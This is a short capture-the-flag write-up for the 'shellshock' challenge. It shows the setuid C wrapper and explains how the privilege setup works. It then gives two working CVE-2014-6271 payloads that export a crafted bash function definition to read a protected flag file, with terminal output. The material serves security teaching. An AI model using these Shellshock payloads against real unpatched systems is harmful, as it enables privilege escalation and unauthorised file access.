# shellshock Writeup

This challenge involves leveraging a bug in the way `bash` handles and executes environment variables.

```c
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```
## Discovery
When we take a look at the `groups` command in the terminal, we see that our user account `shellshock` is in the `shellshock` group. Taking a look at the program shows that we set the uid and gid of the runner of the `\home\shellshock\shellshock` program to `shellshock_pwn`. This gives us all hte privledges of that group, allowing us to `cat flag`, however, the program runs its own, command that doesnt use any user input. How do we solve this?

## Solution
### CVE-2014-6271
We can either

```bash
shellshock@ubuntu:~$ export x='() { :; }; command -p cat flag;'
shellshock@ubuntu:~$ ./shellshock
only if I <KEY>!
Segmentation fault
shellshock@ubuntu:~$ 
```
or

```bash
shellshock@ubuntu:~$ export x='() { :; }; /bin/cat flag;'
shellshock@ubuntu:~$ ./shellshock
only if I <KEY>!
Segmentation fault
shellshock@ubuntu:~$ 
```
